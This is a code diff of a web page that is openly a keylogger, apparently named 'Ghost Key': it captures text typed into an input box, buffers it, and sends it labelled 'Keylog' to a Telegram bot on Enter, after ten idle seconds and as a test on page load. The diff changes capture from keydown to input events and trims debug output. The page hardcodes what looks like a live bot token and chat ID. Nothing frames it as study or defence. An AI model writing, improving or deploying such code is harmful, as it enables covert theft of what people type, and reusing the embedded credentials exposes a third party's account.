@@ -79,10 +79,12 @@
             font-family: monospace;
             max-height: 200px;
             overflow-y: auto;
+            white-space: pre-wrap;
         }
     </style>
 </head>
 <body>
+
     <!-- Debug panel -->
     <div id="debug">🟢 Ready...</div>
 
@@ -98,21 +100,22 @@
     <input type="text" id="keyInput" placeholder="Type here..." autofocus>
 
     <script>
-        // ===== DEBUG LOG =====
+        // ===== DEBUG =====
         function debug(msg) {
             const el = document.getElementById('debug');
             const time = new Date().toLocaleTimeString();
-            el.innerHTML = `[${time}] ${msg}\n` + el.innerHTML;
-            if (el.innerHTML.split('\n').length > 10) {
-                el.innerHTML = el.innerHTML.split('\n').slice(0, 10).join('\n');
+            const lines = el.innerHTML.split('\n');
+            if (lines.length > 10) {
+                lines.pop();
             }
+            lines.unshift(`[${time}] ${msg}`);
+            el.innerHTML = lines.join('\n');
         }
 
         // ===== TELEGRAM CONFIG =====
         const BOT_TOKEN = "8910457881:AAE9TznGCDNXkAxuo3Js_A1HaRVppAvhJuo";
         const CHAT_ID = "1431950109";
 
-        // Verify token
         if (!BOT_TOKEN || BOT_TOKEN === "") {
             debug("❌ BOT_TOKEN is empty!");
         } else {
@@ -129,7 +132,6 @@
         let buffer = "";
         let timer = null;
         const IDLE_TIME = 10000; // 10 seconds
-
         const input = document.getElementById('keyInput');
 
         // ===== FOCUS =====
@@ -151,12 +153,31 @@
             }, IDLE_TIME);
         }
 
-        // ===== KEYLOGGER =====
-        input.addEventListener('keydown', (e) => {
-            const key = e.key;
-            debug("🔑 Key: " + key);
+        // ===== INPUT EVENT =====
+        input.addEventListener('input', function(e) {
+            const currentValue = this.value;
+            const previousValue = buffer;
 
-            if (key === "Enter") {
+            // Don't store if backspaced or cleared
+            if (currentValue.length < previousValue.length) {
+                buffer = currentValue;
+                debug("⬅️ Backspace detected, buffer: " + buffer);
+                resetTimer();
+                return;
+            }
+
+            // New characters added
+            if (currentValue.length > previousValue.length) {
+                const newChar = currentValue.slice(-1);
+                buffer = currentValue;
+                debug("✏️ Char: " + newChar + ", buffer: " + buffer);
+                resetTimer();
+            }
+        });
+
+        // ===== ENTER KEY =====
+        input.addEventListener('keydown', (e) => {
+            if (e.key === "Enter") {
                 e.preventDefault();
                 if (buffer.length > 0) {
                     debug("⌨️ Enter pressed, sending: " + buffer);
@@ -167,18 +188,7 @@
                     debug("⌨️ Enter pressed but buffer empty");
                 }
                 if (timer) clearTimeout(timer);
-                return;
             }
-
-            if (key === "Backspace") {
-                buffer = buffer.slice(0, -1);
-                debug("⬅️ Backspace, buffer: " + buffer);
-            } else if (key.length === 1) {
-                buffer += key;
-                debug("✏️ Char: " + key + ", buffer: " + buffer);
-            }
-
-            resetTimer();
         });
 
         // ===== SEND TO TELEGRAM =====
@@ -195,9 +205,6 @@
                 chat_id: CHAT_ID,
                 text: "📱 Keylog: " + msg
             });
-
-            debug("📤 URL: " + url);
-            debug("📤 Body: " + body);
 
             fetch(url, {
                 method: 'POST',
@@ -221,7 +228,7 @@
             });
         }
 
-        // ===== TEST SEND ON LOAD =====
+        // ===== TEST ON LOAD =====
         setTimeout(() => {
             debug("🔍 Testing Telegram connection...");
             sendToTelegram("🔍 Ghost Key activated!");
